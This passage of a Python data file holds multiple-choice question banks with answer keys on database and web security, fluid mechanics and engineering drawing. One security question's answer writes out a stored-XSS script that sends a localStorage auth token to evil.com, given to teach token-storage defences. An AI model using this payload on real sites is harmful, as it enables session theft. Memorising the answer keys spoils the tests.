            "option_c": "Attempting to create N database connections when the connection pool limit is set to 1",
            "option_d": "Backing up N database tables simultaneously using only 1 physical hard drive cable",
            "correct_option": "A",
            "explanation": "The N+1 problem occurs when an application executes 1 query for a list of parent entities, and then inside a loop executes N individual queries for each entity's related child records.",
            "reasoning_probe": None
        },
        {
            "concept_suffix": "c3",
            "question_type": "application",
            "difficulty": "hard",
            "question_text": "An e-commerce database handles 5,000 product purchases per minute. A developer creates an index on every single column in the `orders` table (18 columns total). Shortly after deployment, database CPU reaches 100% and order creation latency increases by 400%. What technical consequence caused this degradation?",
            "option_a": "Every INSERT statement forced the database to synchronously recalculate and rebalance 18 separate B-Tree index trees on disk",
            "option_b": "B-Tree indexes cannot exceed 256 bytes of total storage before corrupting the database schema",
            "option_c": "Creating indexes causes the database to permanently disable all caching in RAM",
            "option_d": "The database was compelled to convert all relational tables into unindexed CSV files",
            "correct_option": "A",
            "explanation": "While indexes accelerate SELECT reads, every INSERT/UPDATE requires updating all associated index structures. Over-indexing high-write tables causes massive write amplification and I/O bottlenecks.",
            "reasoning_probe": {
                "prompt": "How do B-Tree indexes improve SELECT query performance on large tables?",
                "options": {
                    "A": "By organizing column values into sorted tree nodes, reducing search complexity from O(N) full table scans to O(log N) disk traversals.",
                    "B": "By permanently deleting duplicate rows from the underlying database storage.",
                    "C": "By forcing the client browser to store the entire database in local cache memory.",
                    "D": "By converting all text queries into compiled assembly code before hitting the network."
                },
                "correct_probe": "A"
            }
        },
        {
            "concept_suffix": "c4",
            "question_type": "basic",
            "difficulty": "easy",
            "question_text": "Why should sensitive JSON Web Tokens (JWTs) used for authentication be stored in HttpOnly cookies rather than browser localStorage?",
            "option_a": "HttpOnly cookies cannot be accessed by client-side JavaScript, protecting tokens from Cross-Site Scripting (XSS) theft",
            "option_b": "Browser localStorage is deleted automatically by the operating system every 60 seconds",
            "option_c": "HttpOnly cookies encrypt all backend database tables automatically at rest",
            "option_d": "LocalStorage can only store integer numbers and cannot store alphanumeric strings",
            "correct_option": "A",
            "explanation": "If an attacker executes an XSS attack, any token in `localStorage` can be stolen via `window.localStorage`. HttpOnly cookies are inaccessible to client scripts.",
            "reasoning_probe": None
        },
        {
            "concept_suffix": "c4",
            "question_type": "conceptual",
            "difficulty": "medium",
            "question_text": "What is the primary function of the 'SameSite=Strict' or 'SameSite=Lax' attribute when setting authentication cookies in web applications?",
            "option_a": "Preventing Cross-Site Request Forgery (CSRF) by restricting when cookies are sent with cross-site requests",
            "option_b": "Enforcing that passwords must contain at least 12 characters with special symbols",
            "option_c": "Allowing third-party advertising trackers to monitor user browsing histories across domains",
            "option_d": "Restricting database connections strictly to users located in the same geographic city",
            "correct_option": "A",
            "explanation": "The SameSite cookie attribute controls whether cookies are sent with cross-origin requests, defending against CSRF attacks where unauthorized third-party sites forge authenticated actions.",
            "reasoning_probe": None
        },
        {
            "concept_suffix": "c4",
            "question_type": "application",
            "difficulty": "hard",
            "question_text": "A full-stack banking app stores user session JWTs in `localStorage.setItem('auth_token', token)`. A security audit discovers a stored XSS vulnerability in the user profile comment section. How can an attacker exploit this architectural vulnerability?",
            "option_a": "By injecting `<script>fetch('https://evil.com/steal?t=' + localStorage.getItem('auth_token'))</script>` to exfiltrate session tokens and impersonate victims",
            "option_b": "By altering the victim's physical monitor refresh rate to cause visual display glitches",
            "option_c": "By executing a SQL injection query directly against the client's local graphics driver",
            "option_d": "By forcing the user's Wi-Fi router to disconnect from the local internet service provider",
            "correct_option": "A",
            "explanation": "Because localStorage is readable by any JavaScript running in the origin, an XSS flaw allows arbitrary malicious script to read the JWT and exfiltrate it to an external server.",
            "reasoning_probe": {
                "prompt": "What dual security architecture best mitigates both XSS token theft and CSRF exploits?",
                "options": {
                    "A": "Store tokens in HttpOnly Secure SameSite cookies combined with CSRF anti-forgery tokens or custom header verification.",
                    "B": "Store tokens in public URL query parameters and disable HTTPS encryption.",
                    "C": "Store passwords in plaintext inside HTML comments on the login page.",
                    "D": "Disable all authentication requirements and permit anonymous access to user accounts."
                },
                "correct_probe": "A"
            }
        }
    ]
}

# =============================================================================
# FLUID MECHANICS CURRICULUM (ACCESSIBLE, INTUITIVE & PEDAGOGICALLY RIGOROUS)
# =============================================================================
FLUID_MECHANICS_CURRICULUM = {
    "icon": "🌊",
    "category": "Engineering & Physical Sciences",
    "description": "Comprehensive diagnostic assessment of fluid mechanics: hydrostatic pressure, continuity flow rate conservation, Bernoulli's energy principle, and viscosity boundary layers.",
    "concepts": [
        {
            "id_suffix": "c1",
            "name": "Hydrostatic Pressure & Archimedes' Buoyancy Principle",
            "description": "Fluid pressure variation with depth (P = rho * g * h), Pascal's principle in hydraulic systems, and buoyant force on submerged objects.",
            "prerequisites": [],
            "core_idea": "Static fluid pressure depends solely on fluid density, gravity, and vertical depth. Any submerged object experiences an upward buoyant force equal to the weight of the fluid it displaces.",
            "example": "A hollow steel ship floats because it displaces a volume of water whose weight is equal to the ship's entire loaded weight, while a solid steel coin sinks because its weight exceeds the buoyant force of the tiny volume it displaces.",
            "common_mistake": "Believing a wider container has greater pressure at the bottom than a narrow one at the same depth (hydrostatic paradox), or thinking heavy objects always sink regardless of displaced fluid volume.",
            "key_takeaway": "Hydrostatic pressure depends strictly on vertical liquid depth, and buoyant force equals the weight of displaced fluid."
        },
        {
            "id_suffix": "c2",
            "name": "Continuity Equation & Mass Conservation in Pipe Flow",
            "description": "Volume flow rate conservation (A1 * v1 = A2 * v2), velocity adjustments through cross-sectional changes, and nozzle dynamics.",
            "prerequisites": ["c1"],
            "core_idea": "For incompressible liquids, the mass entering a pipe per second must equal the mass exiting. When the pipe narrows to a smaller area, the fluid speed must increase proportionally.",
            "example": "Placing your thumb over half of a garden hose nozzle cuts the exit area in half, forcing the water speed to double so the same volume of water continues to flow per second.",
            "common_mistake": "Assuming that water slows down in a narrow pipe because it 'bunches up' or gets crowded; in reality, incompressible fluids speed up to maintain constant mass flow.",
            "key_takeaway": "Narrower pipe cross-sections force higher fluid velocity to maintain mass conservation."
        },
        {
            "id_suffix": "c3",
            "name": "Bernoulli's Principle & Pressure-Velocity Dynamics",
            "description": "Conservation of mechanical energy along streamlines, trade-off between fluid speed and static pressure, and aerodynamic lift.",
            "prerequisites": ["c2"],
            "core_idea": "Along a streamline, total mechanical energy is conserved. Where fluid velocity is high, its internal static pressure must decrease to conserve total energy.",
            "example": "Air travels faster over the curved upper surface of an airplane wing than under the flat bottom, creating lower static pressure above the wing and producing upward aerodynamic lift.",
            "common_mistake": "Thinking faster-moving fluid exerts GREATER pressure against pipe walls because 'it hits harder'; in reality, faster-moving fluid exerts lower internal static pressure.",
            "key_takeaway": "Higher fluid speed directly corresponds to lower internal static pressure."
        },
        {
            "id_suffix": "c4",
            "name": "Viscosity, Boundary Layers & Laminar vs. Turbulent Flow",
            "description": "Fluid shear resistance, no-slip wall condition, velocity profiles, and Reynolds number flow transition.",
            "prerequisites": ["c3"],
            "core_idea": "Real fluids possess internal friction (viscosity) that causes fluid directly touching a solid pipe wall to have zero velocity (no-slip condition). The Reynolds number predicts whether flow is smooth and orderly (laminar) or chaotic and vortex-filled (turbulent).",
            "example": "Honey flows much slower than water through a funnel because its high viscosity creates strong internal friction between fluid layers.",
            "common_mistake": "Assuming fluids slide past pipe walls with zero friction, or believing that turbulent flow causes less resistance than smooth laminar flow.",
            "key_takeaway": "Viscosity creates a boundary layer with zero wall velocity, and higher Reynolds numbers induce chaotic turbulent resistance."
        }
    ],
    "misconceptions": [
        {
            "id": "MISC_FLUID_1",
            "code": "M-FLU-01",
            "concept_suffix": "c1",
            "name": "Shape-Dependent Pressure Misconception",
            "description": "Believing container width or shape alters hydrostatic pressure at the bottom, rather than only vertical liquid depth.",
            "remediation": "Remember hydrostatic pressure depends only on vertical depth, fluid density, and gravity (P = rho * g * h). Container width or shape has zero effect on bottom pressure."
        },
        {
            "id": "MISC_FLUID_2",
            "code": "M-FLU-02",
            "concept_suffix": "c2",
            "name": "Nozzle Crowding Slow-Down Trap",
            "description": "Assuming fluid slows down when entering a narrow pipe constriction due to crowding, ignoring incompressible continuity.",
            "remediation": "Incompressible liquids cannot compress; therefore, a narrower area forces higher velocity (A1*v1 = A2*v2) to maintain constant flow rate."
        },
        {
            "id": "MISC_FLUID_3",
            "code": "M-FLU-03",
            "concept_suffix": "c3",
            "name": "Fast Fluid = High Pressure False Mastery",
            "description": "Intuitively believing that higher fluid speed exerts higher internal static pressure against walls, the exact opposite of Bernoulli's principle.",
            "remediation": "Bernoulli's principle states that kinetic energy and pressure energy trade off. As fluid accelerates, kinetic energy increases, so static internal pressure drops."
        },
        {
            "id": "MISC_FLUID_4",
            "code": "M-FLU-04",
            "concept_suffix": "c4",
            "name": "Frictionless Slip Wall Fallacy",
            "description": "Assuming fluids slide past solid pipe boundaries with zero drag, ignoring viscosity and the no-slip condition.",
            "remediation": "Due to viscous adhesive forces, fluid molecules touching a solid surface have zero velocity (no-slip condition), creating a shear boundary layer."
        }
    ],
    "questions": [
        {
            "concept_suffix": "c1",
            "question_type": "basic",
            "difficulty": "easy",
            "question_text": "What determines the hydrostatic water pressure acting on a submerged scuba diver?",
            "option_a": "The vertical depth below the water surface and the density of the fluid",
            "option_b": "The total surface area of the ocean and the shape of the seabed",
            "option_c": "The diver's horizontal swimming speed and compass direction",
            "option_d": "The total volume of water contained in the entire ocean basin",
            "correct_option": "A",
            "explanation": "Hydrostatic pressure is calculated as P = rho * g * h, meaning it depends exclusively on liquid density, gravity, and vertical depth.",
            "reasoning_probe": None
        },
        {
            "concept_suffix": "c1",
            "question_type": "conceptual",
            "difficulty": "medium",
            "question_text": "A large steel cargo ship floats easily in seawater, but a solid steel coin immediately sinks. Why does the ship float?",
            "option_a": "The hollow hull displaces a large volume of water whose total weight equals the ship's weight",
            "option_b": "Seawater cannot exert any upward buoyant force on objects smaller than one meter",
            "option_c": "Steel automatically loses its physical density when welded into boat shapes",
            "option_d": "The ship's engine pushes the surrounding water downward to generate continuous lift",
            "correct_option": "A",
            "explanation": "According to Archimedes' principle, buoyant force equals the weight of displaced fluid. The ship's hollow shape displaces enough water to balance its total weight.",
            "reasoning_probe": None
        },
        {
            "concept_suffix": "c1",
            "question_type": "application",
            "difficulty": "hard",
            "question_text": "A submarine is floating at the surface of the ocean. To submerge safely to a depth of 50 meters, what must the crew do?",
            "option_a": "Flood the ballast tanks with seawater to increase vessel density until it exceeds water density",
            "option_b": "Run the propulsion propellers at maximum reverse thrust while keeping ballast tanks empty",
            "option_c": "Compress the air inside the crew cabin to reduce the submarine's physical dimensions",
            "option_d": "Drop heavy steel anchor chains to pull the submarine downward against the buoyant force",
            "correct_option": "A",
            "explanation": "Flooding ballast tanks replaces air with seawater, increasing the submarine's average density above that of surrounding seawater so negative buoyancy pulls it downward.",
            "reasoning_probe": {
                "prompt": "Why is altering ballast water mass more reliable for depth control than using engine propellers alone?",
                "options": {
                    "A": "Changing ballast mass alters gravitational force to achieve neutral buoyancy at any chosen depth without consuming engine power.",
                    "B": "Propellers are completely ineffective at creating directional thrust inside saltwater.",
                    "C": "Water pressure at 50 meters depth prevents propeller blades from rotating.",
                    "D": "Ballast tanks generate magnetic attraction toward the ocean floor."
                },
                "correct_probe": "A"
            }
        },
        {
            "concept_suffix": "c2",
            "question_type": "basic",
            "difficulty": "easy",
            "question_text": "According to the continuity equation for incompressible fluids (A1 * v1 = A2 * v2), what happens when water flows from a wide pipe into a narrow pipe?",
            "option_a": "The water speed increases to maintain a constant volume flow rate",
            "option_b": "The water slows down because it becomes congested in the narrow section",
            "option_c": "The water density triples while its velocity drops to zero",
            "option_d": "The total mass of water passing per second decreases significantly",
            "correct_option": "A",
            "explanation": "Because water is incompressible, mass entering per second must equal mass exiting. Reducing cross-sectional area forces velocity to increase proportionally.",
            "reasoning_probe": None
        },
        {
            "concept_suffix": "c2",
            "question_type": "conceptual",
            "difficulty": "medium",
            "question_text": "Why does water shoot out much faster and farther when you place your thumb over part of a garden hose nozzle?",
            "option_a": "Reducing the exit area forces the exiting water velocity to increase to maintain volume flow",
            "option_b": "Your thumb introduces air bubbles that pull the water stream outward with extra force",
            "option_c": "The water molecules compress into a solid state and rebound off your thumb",
            "option_d": "The garden hose pump increases its mechanical horsepower whenever a nozzle is touched",
            "correct_option": "A",
            "explanation": "Covering part of the opening reduces the exit cross-sectional area (A). By the continuity equation (Q = A * v), fluid speed (v) must rise.",
            "reasoning_probe": None
        },
        {
            "concept_suffix": "c2",
            "question_type": "application",
            "difficulty": "hard",
            "question_text": "Water flows through a horizontal pipe that constricts from an area of 0.04 m² to 0.01 m². If the initial velocity in the wide section is 2 m/s, what is the velocity in the constricted section?",
            "option_a": "8 m/s",
            "option_b": "0.5 m/s",
            "option_c": "4 m/s",
            "option_d": "2 m/s",
            "correct_option": "A",
            "explanation": "By the continuity equation A1*v1 = A2*v2: 0.04 * 2 = 0.01 * v2 => v2 = 0.08 / 0.01 = 8 m/s.",
            "reasoning_probe": {
                "prompt": "Why does the fluid speed increase by exactly a factor of 4 when the pipe area is cut to one-fourth?",
                "options": {
                    "A": "Because mass conservation requires an equal volume of liquid to pass through every cross-section in equal time.",
                    "B": "Because friction with the pipe walls is eliminated when the diameter decreases.",
                    "C": "Because fluid density expands four-fold to fill the narrow constriction.",
                    "D": "Because gravity pulls harder on narrow pipes than on wide pipes."
                },
                "correct_probe": "A"
            }
        },
        {
            "concept_suffix": "c3",
            "question_type": "basic",
            "difficulty": "easy",
            "question_text": "What does Bernoulli's principle state regarding the relationship between fluid speed and internal fluid pressure along a streamline?",
            "option_a": "As the speed of a moving fluid increases, its internal static pressure decreases",
            "option_b": "As fluid speed increases, its internal static pressure increases proportionally",
            "option_c": "Fluid speed and fluid pressure are completely unrelated in flowing liquids",
            "option_d": "Faster moving fluids always freeze into ice regardless of ambient temperature",
            "correct_option": "A",
            "explanation": "Bernoulli's principle reflects conservation of mechanical energy: higher kinetic energy (speed) corresponds to lower static pressure energy.",
            "reasoning_probe": None
        },
        {
            "concept_suffix": "c3",
            "question_type": "conceptual",
            "difficulty": "medium",
            "question_text": "An airplane wing is cambered (curved on top and flatter on bottom). How does this shape generate aerodynamic lift according to fluid dynamics?",
            "option_a": "Air moves faster over the curved top, creating lower static pressure above the wing than beneath it",
            "option_b": "Air compresses underneath the wing, turning into a solid cushion of air that pushes the plane up",
            "option_c": "The curved upper wing surface attracts magnetic fields from the upper atmosphere",
            "option_d": "Air on top of the wing stops moving entirely, creating an absolute vacuum above the wing",
            "correct_option": "A",
            "explanation": "Faster airflow over the curved upper surface reduces static pressure above the wing (Bernoulli's principle), creating a net upward pressure differential that produces lift.",
            "reasoning_probe": None
        },
        {
            "concept_suffix": "c3",
            "question_type": "application",
            "difficulty": "hard",
            "question_text": "During a severe hurricane, gale-force winds blow across the peaked roof of a house. Why are roofs often ripped upward off houses rather than blown downward?",
            "option_a": "High-speed wind over the roof creates low pressure above, while calm air inside remains at higher atmospheric pressure",
            "option_b": "Hurricane winds heat the roof tiles, causing them to vaporize and float into the sky",
            "option_c": "Wind passing over a roof generates static electricity that repels the ground",
            "option_d": "The house foundations expand upward when soaked by torrential rainwater",
            "correct_option": "A",
            "explanation": "Fast air traveling across the exterior roof surface produces a sharp drop in external static pressure. The normal atmospheric pressure trapped inside the house pushes upward with immense force.",
            "reasoning_probe": {
                "prompt": "Why does opening windows slightly during high-speed windstorms help protect the roof from lifting?",
                "options": {
                    "A": "It allows internal air to escape, equalizing inside pressure with the low outside pressure.",
                    "B": "It lets wind blow straight through the house without exerting any pressure on walls.",
                    "C": "It cools down the interior rooms to prevent heat expansion of the ceiling.",
                    "D": "It increases the weight of the house by allowing rain to enter the living room."
                },
                "correct_probe": "A"
            }
        },
        {
            "concept_suffix": "c4",
            "question_type": "basic",
            "difficulty": "easy",
            "question_text": "What dimensionless parameter is used in fluid mechanics to predict whether a flow is smooth (laminar) or chaotic (turbulent)?",
            "option_a": "Reynolds number (Re)",
            "option_b": "Richter scale",
            "option_c": "Decibel level",
            "option_d": "Kelvin index",
            "correct_option": "A",
            "explanation": "The Reynolds number (Re = rho * v * L / mu) quantifies the ratio of inertial forces to viscous forces, predicting the transition from laminar to turbulent flow.",
            "reasoning_probe": None
        },
        {
            "concept_suffix": "c4",
            "question_type": "conceptual",
            "difficulty": "medium",
            "question_text": "What does the 'no-slip condition' in fluid mechanics mean when a viscous fluid flows through a pipe?",
            "option_a": "Fluid molecules directly touching the pipe wall have zero velocity relative to the wall",
            "option_b": "The pipe wall must be polished completely smooth to prevent any friction",
            "option_c": "Fluid flows with identical uniform velocity across the entire pipe cross-section",
            "option_d": "No fluid is permitted to leak out through microscopic pores in the pipe",
            "correct_option": "A",
            "explanation": "Because of viscous adhesive forces between fluid and solid, the layer of fluid in direct contact with a solid surface adheres to it, having zero relative velocity.",
            "reasoning_probe": None
        },
        {
            "concept_suffix": "c4",
            "question_type": "application",
            "difficulty": "hard",
            "question_text": "Why are golf balls manufactured with small dimples on their surface rather than being made completely smooth?",
            "option_a": "Dimples trigger a thin turbulent boundary layer that delays flow separation, dramatically reducing aerodynamic pressure drag",
            "option_b": "Dimples reduce the physical weight of the ball so gravity has less effect during flight",
            "option_c": "Dimples allow air to pass directly through the interior core of the ball",
            "option_d": "Dimples create whistling sound waves that prevent birds from intercepting the ball",
            "correct_option": "A",
            "explanation": "A turbulent boundary layer has more kinetic energy, allowing it to stay attached to the curved rear of the ball longer before separating. This drastically shrinks the low-pressure turbulent wake, reducing drag.",
            "reasoning_probe": {
                "prompt": "Why does delaying boundary layer separation reduce the net aerodynamic drag on a sphere?",
                "options": {
                    "A": "Delayed separation narrows the turbulent low-pressure wake behind the sphere, reducing the net backward pressure force.",
                    "B": "Delayed separation eliminates all skin friction drag between air and the ball's surface.",
                    "C": "Delayed separation forces the ball to travel in a vacuum where air resistance is zero.",
                    "D": "Delayed separation makes the ball spin faster without transferring energy to the surrounding air."
                },
                "correct_probe": "A"
            }
        }
    ]
}

# =============================================================================
# ENGINEERING GRAPHICS & TECHNICAL DRAWING CURRICULUM
# =============================================================================
ENGINEERING_GRAPHICS_CURRICULUM = {
    "icon": "📐",
    "category": "Engineering Graphics & Design",
    "description": "Comprehensive diagnostic assessment of Engineering Graphics & Technical Drawing: Orthographic projections, First vs. Third angle standards, Isometric spatial visualization, Sections of solids, and CAD dimensioning rules.",
    "concepts": [
        {
            "id_suffix": "c1",
            "name": "Orthographic Projections & Principal Planes",
            "description": "Multi-view 2D representation of 3D objects projecting onto Horizontal Plane (HP), Vertical Plane (VP), and Profile Plane (PP); First-Angle vs. Third-Angle projection standards.",
            "prerequisites": [],
            "core_idea": "3D objects are visualized on 2D planes by projecting perpendicular parallel lines from the object onto reference planes (HP and VP). In First Angle projection, the object lies between the observer and the plane; in Third Angle projection, the plane lies between the observer and the object.",
            "example": "In First-Angle projection (used across India and ISO standards), the Top View is placed directly BELOW the Front View because the projection rays pass through the object to the horizontal plane below.",
            "common_mistake": "Placing the Top View above the Front View in First-Angle projection, or confusing the Left-Hand side view placement with the right side.",
            "key_takeaway": "In First Angle projection, Top View is below Front View and Left Side View is on the right of the Front View."
        },
        {
            "id_suffix": "c2",
            "name": "Isometric Projections & Spatial Visualization",
            "description": "3D pictorial representations where three principal axes are inclined 120 degrees apart; isometric scale foreshortening (approx 0.816) and box-method plotting of non-isometric lines.",
            "prerequisites": ["c1"],
            "core_idea": "An isometric projection tilts a 3D object so all three axes foreshorten equally by a factor of sqrt(2/3) ≈ 0.816. Non-isometric lines cannot be measured directly with an isometric scale; they must be plotted using coordinates on isometric axes.",
            "example": "To draw an inclined pyramid edge, a drafter draws an isometric bounding box, measures lengths along the 30-degree isometric axes to find the apex coordinates, and connects the vertices with straight lines.",
            "common_mistake": "Measuring non-isometric (inclined or oblique) lines directly using an isometric scale without locating their end-point coordinates along isometric axes.",
            "key_takeaway": "Isometric lines foreshorten by 0.816, while non-isometric lines must be plotted by locating their endpoints."
        },
        {
            "id_suffix": "c3",
            "name": "Sections of Solids & Development of Surfaces",
            "description": "Imaginary cutting planes revealing internal hollow geometry, cross-hatching at 45 degrees, true shape of sections, and flat pattern surface development for manufacturing.",
            "prerequisites": ["c2"],
            "core_idea": "Sectioning cuts an object with an imaginary plane to expose interior details without confusing dashed hidden lines. Unrolling the lateral surface of a 3D solid produces a 2D flat development pattern used for sheet metal fabrication.",
            "example": "Cutting a right cylinder with a plane inclined to its base reveals an ellipse as the true shape, and unrolling the lateral surface of an uncut cylinder develops into a simple rectangle of length 2*pi*R.",
            "common_mistake": "Drawing section hatching lines across visible solid outlines, or assuming the lateral development of a cone is a triangle rather than a sector of a circle.",
            "key_takeaway": "Section hatching reveals internal solid material at 45 degrees, and surface development produces flat manufacturing patterns."
        },
        {
            "id_suffix": "c4",
            "name": "Dimensioning Rules, Tolerances & CAD Standards",
            "description": "Engineering dimensioning standards (Aligned vs. Unidirectional), limits, fits (clearance, transition, interference), line weight conventions, and Computer-Aided Drafting (CAD) layers.",
            "prerequisites": ["c3"],
            "core_idea": "Engineering drawings convey exact manufacturing sizes and limits using standardized line styles (continuous thick, dashed thin, long-short chain centerlines) and dimensioning systems (Aligned vs. Unidirectional).",
            "example": "In the Unidirectional dimensioning system, all numerical values are placed horizontally and read from the bottom of the sheet, regardless of the orientation of the dimension line.",
            "common_mistake": "Crossing dimension lines with extension lines, duplicating dimensions unnecessarily, or using visible outlines as dimension lines.",
            "key_takeaway": "Standardized dimensioning and line styles ensure unambiguous communication between design and manufacturing."
        }
    ],
    "misconceptions": [
        {
            "id_suffix": "m1",
            "concept_suffix": "c1",
            "name": "First-Angle vs. Third-Angle Inversion Trap",
            "description": "Confusing First-Angle and Third-Angle projection standards, such as placing the Top View above the Front View in First-Angle projection.",
            "remediation": "Remember that in First-Angle projection, the object is placed between the observer and the plane. Projecting downward places the Top View BELOW the Front View."
        },
        {
            "id_suffix": "m2",
            "concept_suffix": "c2",
            "name": "Non-Isometric Direct Measurement Fallacy",
            "description": "Attempting to measure non-isometric (inclined) lines directly with an isometric scale rather than finding endpoint coordinates.",
            "remediation": "Only lines parallel to the three principal isometric axes foreshorten by 0.816. All other inclined lines must be constructed by finding their endpoints using the box method."
        },
        {
            "id_suffix": "m3",
            "concept_suffix": "c3",
            "name": "Cutting Plane Hatching & True Shape Confusion",
            "description": "Failing to distinguish between apparent section view and true shape of an inclined cut, or crossing visible part boundaries with hatch lines.",
            "remediation": "The true shape of a cut is only visible when looking perpendicular to the cutting plane. Hatch lines represent solid cut material and never extend past boundary outlines."
        },
        {
            "id_suffix": "m4",
            "concept_suffix": "c4",
            "name": "Dimensioning Precedence & Over-Constraint Confusion",
            "description": "Crossing dimension lines, using visible outlines as dimension lines, or confusing Aligned and Unidirectional reading orientations.",
            "remediation": "Always place smaller dimensions closer to the view and larger overall dimensions further out to prevent crossing lines. Never use object outlines as dimension lines."
        }
    ],
    "questions": [
        {
            "concept_suffix": "c1",
            "question_type": "basic",
            "difficulty": "easy",
            "question_text": "In First-Angle orthographic projection, where is the Top View (plan) positioned relative to the Front View (elevation)?",
            "option_a": "Directly below the Front View",
            "option_b": "Directly above the Front View",
            "option_c": "To the immediate right of the Front View",
            "option_d": "Superimposed on top of the Front View",
            "correct_option": "A",
            "explanation": "In First-Angle projection, the object lies in the first quadrant between the observer and the horizontal plane. Projecting downward onto the horizontal plane places the Top View directly below the Front View.",
            "reasoning_probe": None
        },
        {
            "concept_suffix": "c1",
            "question_type": "conceptual",
            "difficulty": "medium",
            "question_text": "A straight line AB is inclined to the Horizontal Plane (HP) and parallel to the Vertical Plane (VP). How will its projections appear in the front and top views?",
            "option_a": "The front view shows the true length and true inclination, while the top view is foreshortened and parallel to XY",
            "option_b": "Both the front and top views show the true length of the line",
            "option_c": "The top view shows the true length, while the front view appears as a single point",
            "option_d": "Neither view shows the true length because the line is inclined",
            "correct_option": "A",
            "explanation": "Since the line is parallel to the VP, projection lines from AB strike the VP perpendicularly without foreshortening, showing its true length and true angle. Its top view is projected onto the HP as a foreshortened line parallel to reference line XY.",
            "reasoning_probe": None
        },
        {
            "concept_suffix": "c1",
            "question_type": "application",
            "difficulty": "hard",
            "question_text": "An engineering drawing prepared under First-Angle projection shows an asymmetric mechanical bracket. On which side of the Front View must the Right-Hand Side View be drawn?",
            "option_a": "On the left side of the Front View",
            "option_b": "On the right side of the Front View",
            "option_c": "Directly underneath the Top View",
            "option_d": "On a separate auxiliary sheet rotated by 90 degrees",
            "correct_option": "A",
            "explanation": "In First-Angle projection, the observer views the right side of the object, and the projection lines travel through the object to project onto the profile plane located on the opposite (left) side.",
            "reasoning_probe": {
                "prompt": "Why is the Right-Hand view drawn on the left side of the Front View in First-Angle projection?",
                "options": {
                    "A": "In First-Angle projection, the object is between the observer and the plane, so rays from the right side project onto the profile plane situated on the left.",
                    "B": "Drafting standards require all side views to be drawn on the left to leave room for the title block on the right.",
                    "C": "The right side view is mirrored horizontally to correct for optical lens distortion.",
                    "D": "In First-Angle projection, the profile plane is placed in front of the observer."
                },
                "correct_probe": "A"
            }
        },
        {
            "concept_suffix": "c2",
            "question_type": "basic",
            "difficulty": "easy",
            "question_text": "When constructing an isometric drawing, what is the angle between the three principal isometric axes?",
            "option_a": "120 degrees between each axis, with two receding axes inclined at 30 degrees to the horizontal",
            "option_b": "90 degrees between each axis, matching standard 2D Cartesian axes",
            "option_c": "45 degrees to the horizontal for all three axes",
            "option_d": "60 degrees between the vertical axis and horizontal baseline",
            "correct_option": "A",
            "explanation": "In isometric projection, the three coordinate axes of a cube project onto the drawing plane at equal angles of 120 degrees apart, with one vertical axis and two receding axes at 30 degrees to the horizontal.",
            "reasoning_probe": None
        },
        {
            "concept_suffix": "c2",
            "question_type": "conceptual",
            "difficulty": "medium",
            "question_text": "Why is an isometric scale ratio approximately 0.816 (sqrt(2/3)) of the true length in an isometric projection?",
            "option_a": "Because the three mutually perpendicular edges of a cube are tilted at equal angles (approx 35 deg 16 min) away from the projection plane",
            "option_b": "Because ink spreads out on paper, requiring lines to be drawn 18.4% shorter",
            "option_c": "Because isometric drawing tools only support metric millimeter increments",
            "option_d": "Because human perspective vision naturally magnifies objects drawn at 30 degrees",
            "correct_option": "A",
            "explanation": "When a cube is positioned for isometric projection, its body diagonal is perpendicular to the picture plane, tilting each principal axis away from the plane by 35°16'. The cosine of this angle is cos(35°16') = sqrt(2/3) ≈ 0.816.",
            "reasoning_probe": None
        },
        {
            "concept_suffix": "c2",
            "question_type": "application",
            "difficulty": "hard",
            "question_text": "A drafter must construct the isometric projection of a regular pyramid with a square base and slanted triangular edges. How should the drafter draw the slanted (non-isometric) edges?",
            "option_a": "Locate the corners of the base and apex using measurements along the 30-degree isometric axes, then connect them with straight lines",
            "option_b": "Measure the slant length directly along the inclined line using the 0.816 isometric scale",
            "option_c": "Rotate the entire drawing sheet by 45 degrees and draw the edges as vertical lines",
            "option_d": "Approximate the slanted edges using a circular French curve",
            "correct_option": "A",
            "explanation": "Non-isometric lines are not parallel to the isometric axes and do not foreshorten by 0.816. The only correct method (box method) is to locate their start and end coordinate points along isometric lines and connect them.",
            "reasoning_probe": {
                "prompt": "Why can non-isometric lines NOT be measured directly with an isometric scale?",
                "options": {
                    "A": "Lines not parallel to isometric axes have arbitrary inclinations, so their foreshortening does not follow the standard 0.816 isometric ratio.",
                    "B": "Isometric scales only have markings for whole centimeter numbers.",
                    "C": "Non-isometric lines curve into hyperbolic arcs when projected into 2D.",
                    "D": "Inclined lines lose their mass when projected onto reference planes."
                },
                "correct_probe": "A"
            }
        },
        {
            "concept_suffix": "c3",
            "question_type": "basic",
            "difficulty": "easy",
            "question_text": "In engineering section views, how are cut solid surfaces conventionally identified and cross-hatched?",
            "option_a": "With thin continuous parallel lines drawn at 45 degrees to the main outline of the section",
            "option_b": "With solid black shading that completely covers the cut surface",
            "option_c": "With dashed hidden lines spaced randomly across the part",
            "option_d": "With concentric circular rings centered on the cutting plane",
            "correct_option": "A",
            "explanation": "Section lining (hatching) uses thin, continuous parallel lines conventionally drawn at 45° to the main outline or centerline of the section, spaced evenly (1.5mm to 3mm).",
            "reasoning_probe": None
        },
        {
            "concept_suffix": "c3",
            "question_type": "conceptual",
            "difficulty": "medium",
            "question_text": "When a right circular cylinder is cut by an imaginary section plane inclined to its base axis, what is the true shape of the cut surface?",
            "option_a": "An ellipse",
            "option_b": "A circle of smaller diameter",
            "option_c": "A parabola with its focus at the cylinder center",
            "option_d": "A rectangle with rounded corners",
            "correct_option": "A",
            "explanation": "An inclined plane cutting entirely across all generators of a right circular cylinder always produces a true shape that is an ellipse, with its minor axis equal to the cylinder diameter.",
            "reasoning_probe": None
        },
        {
            "concept_suffix": "c3",
            "question_type": "application",
            "difficulty": "hard",
            "question_text": "A sheet metal fabricator needs to cut out the flat pattern to manufacture a right circular cone of base radius R and slant height L. What geometrical shape will the developed lateral surface take?",
            "option_a": "A circular sector of radius L and central angle theta = (R / L) * 360 degrees",
            "option_b": "An equilateral triangle with base equal to 2 * pi * R",
            "option_c": "A rectangle of length 2 * pi * R and height equal to vertical cone height H",
            "option_d": "A full 360-degree circle with a circular hole cut out of its center",
            "correct_option": "A",
            "explanation": "Unrolling the lateral surface of a cone produces a sector of a circle with radius equal to the slant height L. The arc length of the sector equals the base perimeter (2*pi*R), giving central angle theta = (R/L) * 360°.",
            "reasoning_probe": {
                "prompt": "Why does the lateral surface of a cone develop into a circular sector rather than a rectangle?",
                "options": {
                    "A": "Every straight line from the apex to the circular base is of constant length L, so rolling the cone on a flat plane traces an arc of constant radius L.",
                    "B": "Sheet metal naturally shrinks into circular arcs when cut with industrial shears.",
                    "C": "Cones have variable wall thickness that distorts rectangular developments.",
